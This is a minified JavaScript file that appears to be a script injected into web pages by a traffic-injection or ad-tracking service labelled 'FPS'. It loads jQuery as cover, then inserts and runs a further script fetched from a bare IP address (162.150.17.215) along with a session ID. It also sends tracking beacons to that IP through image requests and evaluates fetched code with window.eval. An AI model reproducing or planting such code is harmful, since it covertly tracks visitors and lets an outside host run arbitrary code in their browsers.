(function(){function sendAccounting(e,t){e=e||1;t=t||0;var n=new Image;11==t||R&&6==t||(n.src="http://162.150.17.215:80/"+e+"-1/7438b0b3-c53f-43b3-b089-0cf426ef3bdf_cb32:3290:8a:88d0:8a5f::1/"+t+"."+(d+j));2==e&&I.d();return n}function e(e){return R?"http://162.150.17.215:80/Check/2/1/7438b0b3-c53f-43b3-b089-0cf426ef3bdf/cb32:3290:8a:88d0:8a5f::1/nkow0x":1==e&&"http://162.150.17.215/CheckUrl/1/1"}function t(t){var i,r,o=Math.floor(1e3*j),c="fp",s=c+o,a={h:"1e66dd08712cf1c3320d3d1468ba15b5da5fb02a"},u="_!$[]fp7438b0b3-c53f-43b3-b089-0cf426ef3bdf[]$!_";I={d:function(){C[u]===a&&(C[u]=0)},s:function(e){C[u].c=e}};if(R&&T-R>54e5)return 11;"string"==typeof t.jsURI&&(t.jsURI=[t.jsURI]);if((i=C[u])&&i.h===a.h&&!i.c)return 1;r=i&&i.c;C[u]=a;if(t.requireTopWindow&&C!=top)return 2;if(t.requireObjectHasOwnProperty&&!Object.prototype.hasOwnProperty)return 3;if(t.json){if("string"==typeof t.json)try{t.json=U.eval("("+t.json+")")}catch(f){return 4}t.json.minimum_width=t.minWidth=t.json.minimum_width||t.minWidth;t.json.minimum_height=t.minHeight=t.json.minimum_height||t.minHeight;t.json._accounting={stopTime:p,sendAccounting:sendAccounting,allowNext:I,uri:"http://162.150.17.215/static",check:e("%TOPURLMATCH%"),direct:!1,prev:r}}if(!(t.json&&""===t.json.sprite_img||n(C,E,t.minHeight,t.minWidth)))return 5;if(t.json2uri){for(;void 0!==C[s];)s=c+ ++o;C[s]=t.json;for(i=0;t.jsURI.length>i;i++)t.jsURI[i]+=(-1!==t.jsURI[i].indexOf("?")?"&":"?")+s}}function n(e,t,n,i){var r=t.documentElement||t.body||{},o=e.innerWidth||r.clientWidth||0,c=e.innerHeight||r.clientHeight||0;return o>=n&&c>=i||!(o+c)}function i(){var e,n,i=(new Date).getTime(),r={//
// Carefully adjust the following values as needed
// Remove a line completely if it is not needed
requireTopWindow: false,
minWidth: 0,
minHeight: 0,
jsURI: 'http://162.150.17.215/static/Device/learn.js?FPSESSIONID=7438b0b3-c53f-43b3-b089-0cf426ef3bdf&COMMIP=162.150.17.215',
sendEarlyAccounting: true,

onInsert: function(){
// Insert any code below that you would like to run after the script
// specified in jsURI has been inserted.  Note that if any of the
// conditions stated above (i.e. minWidth) are not met the jsURI
// script will not be inserted and this code will also not be run.
//
// If "sendEarlyAccounting" is removed or set to false, you must call
// the "sendAccounting" function in order for this message to be properly
// counted in FPS.
// Example:  sendAccounting();

// ** DO NOT USE document.write **
// Begin code area


// End code area
},

/**/
1:2};if((e=t(r))||i>p)sendAccounting(2,e);else{r.sendEarlyAccounting&&sendAccounting(1);if(r.jsURI){m=u(E);for(e=0;r.jsURI.length>e;e++){n=o(E,"script",null,"src",c(r.jsURI[e]),"type",g);n[j]=r.json;m.appendChild(n)}}if(r.onInsert)try{r.onInsert()}catch(s){}}}function r(e){var t,n,i=[function(){return new XMLHttpRequest},function(){return new ActiveXObject("Msxml2.XMLHTTP")},function(){return new ActiveXObject("Microsoft.XMLHTTP")},U.createRequest];for(n=0;i.length>n;n++){t=0;try{t=i[n]();break}catch(r){t=0}}if(t)try{t.open("GET",e,!1);t.setRequestHeader("X-PLCS","xhr");t.send(null);if(200==t.status)return t.responseText||" "}catch(r){}}function o(e,t,n){var i,r=e.createElement(t);n&&r.appendChild(e.createTextNode(n));for(i=3;arguments.length>i;i+=2)r.setAttribute(arguments[i],arguments[i+1]);return r}function c(e){return e.replace("$PAGEURL$",escape(a(C).href))}function s(){U.V=s.V;s.oncomplete&&s.oncomplete()}function a(e){return e.location||e.document.location||{}}function u(e,t,n){t=e.getElementsByTagName("script");return((n=t.length)?t[n-1]:d=4).parentNode||e.body||e.documentElement.firstChild}try{var f,h,p,m,d,l,I,g="text/javascript",j=Math.random(),T=(new Date).getTime(),R=parseInt("nkow0x",36),y=parseFloat("30"),U=window,w=document,C=U,E=w;h="http://"+unescape("code.jquery.com%2Fjquery-2.1.3.js");m=w.createElement("div");d=3;m.innerHTML="<!--[if IE]><i></i><![endif]-->";l=m.getElementsByTagName("i").length;s.V=U.V;U.V=s;isNaN(y)&&(y=15);p=T+1e3*y-2;R=isFinite(R)?1e3*R:0;h+=(~h.indexOf("?")?~h.indexOf(";")?";":"&":"?")+"_fp"+(0|1e3*j)+"="+j;if(h.split("/")[2]==a(U).host){f=r(h);if(f){d=1;s.js=f;s.oncomplete=i;return}}if(w.readyState==(l?"interactive":"loading")){d=2;w.write("<scr".concat('ipt src="')+h+'" type="'+g+'"></scr'.concat("ipt>"))}else{m=u(w);m.appendChild(o(w,"script",0,"src",h,"type",g,"async",!1))}i()}catch(M){}})();if(window.V){if(V.js)try{window.eval(V.js)}catch(e){}V()}